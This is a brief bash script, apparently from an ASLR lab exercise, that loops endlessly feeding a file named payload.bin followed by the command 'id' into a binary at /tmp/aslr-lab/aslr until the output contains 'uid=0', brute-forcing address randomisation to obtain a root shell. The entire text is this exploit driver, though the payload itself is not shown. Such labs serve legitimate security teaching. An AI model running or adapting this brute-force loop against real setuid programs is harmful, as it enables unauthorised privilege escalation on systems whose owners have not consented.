i=1
while true
do
    echo "[+] try $i"

    if (cat payload.bin; echo id) | /tmp/aslr-lab/aslr 2>/dev/null | grep -q "uid=0"
    then
        echo "[+] SUCCESS at try $i"
        break
    fi

    i=$((i+1))
done
